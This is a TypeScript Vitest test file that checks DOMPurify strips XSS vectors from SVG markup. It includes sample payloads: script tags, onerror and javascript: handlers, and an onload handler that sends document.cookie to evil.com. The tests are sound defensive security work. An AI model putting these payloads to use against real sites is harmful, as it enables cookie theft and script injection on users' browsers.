import { describe, it, expect, beforeEach } from 'vitest';
import DOMPurify from 'dompurify';
import { JSDOM, type DOMWindow } from 'jsdom';

/**
 * Security test: SVG sanitization before rendering
 * Tests that DOMPurify correctly strips malicious content from SVG files
 * before they are rendered with dangerouslySetInnerHTML.
 */

describe('SVG Sanitization Security (SI-XSS)', () => {
  let purify: typeof DOMPurify;
  let jsdomWindow: DOMWindow;

  beforeEach(() => {
    const dom = new JSDOM('');
    jsdomWindow = dom.window;
    purify = DOMPurify(jsdomWindow as unknown as Window);
  });

  it('strips <script> tags from SVG', () => {
    const maliciousSvg = `<svg xmlns="http://www.w3.org/2000/svg">
      <script>alert("XSS")</script>
      <rect width="100" height="100"/>
    </svg>`;
    const sanitized = purify.sanitize(maliciousSvg, { USE_PROFILES: { svg: true } });
    expect(sanitized).not.toContain('<script');
    expect(sanitized).not.toContain('alert(');
  });

  it('strips onerror event handlers', () => {
    const maliciousSvg = `<svg><image onerror="alert('xss')" href="x"/></svg>`;
    const sanitized = purify.sanitize(maliciousSvg, { USE_PROFILES: { svg: true } });
    // Verify onerror is NOT in the sanitized output
    expect(sanitized).not.toContain('onerror');
  });

  it('strips javascript: href attributes', () => {
    const maliciousSvg = `<svg><a href="javascript:alert(1)"><text>click</text></a></svg>`;
    const sanitized = purify.sanitize(maliciousSvg, { USE_PROFILES: { svg: true } });
    expect(sanitized).not.toContain('javascript:');
  });

  it('strips onload event handlers on SVG element', () => {
    const maliciousSvg = `<svg onload="fetch('https://evil.com/'+document.cookie)">
      <circle r="50"/>
    </svg>`;
    const sanitized = purify.sanitize(maliciousSvg, { USE_PROFILES: { svg: true } });
    expect(sanitized).not.toContain('onload');
    expect(sanitized).not.toContain('evil.com');
  });

  it('preserves legitimate SVG content after sanitization', () => {
    const cleanSvg = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
      <rect width="100" height="100" fill="blue"/>
      <text x="50" y="50">Hello</text>
    </svg>`;
    const sanitized = purify.sanitize(cleanSvg, { USE_PROFILES: { svg: true } });
    expect(sanitized).toContain('rect');
    expect(sanitized).toContain('Hello');
  });

  it('[REGRESSION] querySelectorAll onerror check — not just textContent', () => {
    // Bug: textContent.includes('onerror=') can return TRUE for text nodes like
    // "The image had an onerror= attribute which was stripped"
    // Correct check: querySelectorAll('[onerror]').length === 0
    const div = jsdomWindow.document.createElement('div');
    div.innerHTML = '<p>This text mentions onerror= safely</p>';
    // The text node contains "onerror=" but NO element has the onerror attribute
    expect(div.querySelectorAll('[onerror]').length).toBe(0);
  });
});
